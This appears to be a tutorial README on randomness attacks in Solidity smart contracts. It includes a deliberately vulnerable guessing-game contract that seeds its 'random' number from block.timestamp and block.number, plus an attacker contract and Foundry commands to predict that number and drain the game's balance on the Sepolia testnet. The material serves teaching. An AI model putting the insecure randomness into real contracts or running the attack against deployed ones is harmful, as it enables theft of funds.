# Randomness-attack- 
## 1- What is Randomness?
run same code get diffirent result

## 2- what is Determinisitic System?
   * Same Input == Same Outbut
   * every node must agree on the same state
    
  ```solidity
 function test(uint256 a) public pure returns(uint256){
      return a*2;
   }          // same input same output
   
```
 ![Image](https://github.com/user-attachments/assets/266e1bd8-ba9d-4746-a793-4fb934ed254b)


## 3- why we need randomness in web3
   * Games NFT (Non Fungible Tokens  ) [ERC721](https://docs.openzeppelin.com/contracts/3.x/erc721)  Choose Winner
   * 🏛️ DAO = Decentralized Autonomous Organization choose Member to Voting
   * AirDrops
   * Validatores , committes , nodes  proof of stake (ethereum2, polkadot ,Algorand)
   * Defi Decentralized Finance
     
# Example 01
Smart contract Game to guess number and win the game

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Game {
    constructor() payable{

    }

    function play(uint256 guess) external{
        uint256 randomNumber = block.timestamp + block.number; 

        if(randomNumber == guess){
           payable(msg.sender). transfer(address(this).balance);        
        }
    }

}
```
Command to compile
```
forge compile
```
Command to deploy on sepolia
```
 forge create <contract path> --rpc-url <sepolia rpc>  --private-key <your private key> --value <charge contract with ethereum> --broadcast
```
# 🔌 Who Provides RPC Endpoints?

There are several popular providers that offer reliable RPC endpoints for interacting with blockchain networks:

- [Infura](https://infura.io)
- [Alchemy](https://www.alchemy.com)
- [Ankr](https://www.ankr.com)
- [QuickNode](https://www.quicknode.com)

Alternatively, you can run your own Ethereum node (e.g., using Geth or Nethermind) and host your own RPC endpoint for full control and privacy.


Command to check Balance
```
cast balance 0xYourContractAddress --rpc-url <your rpc>
```

## Smart contract to attack the Game

```solidity

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IGame{
        function play(uint256 guess) external;
    }

contract Attacker{
    IGame public game;  //store Games Address

    constructor(address GameContract) payable{
        game = IGame(GameContract);

    }

    function attack() external payable{
        uint predictNumber = block.timestamp + block.number;
        game.play(predictNumber);
    }
    receive() external payable {}

}
```
Command to compile
```
forge compile <contract path>
```
Command to deploy on sepolia
```
 forge create <contract path> --rpc-url <sepolia rpc>  --private-key <your private key>  --broadcast
```
Command to call function play

```
 cast send <contract address>  --rpc-url <your rpc> --private-key <your private key >   '<function name>'
```

Command to check Balance
```
cast balance 0xYourContractAddress --rpc-url <your rpc>
```



   

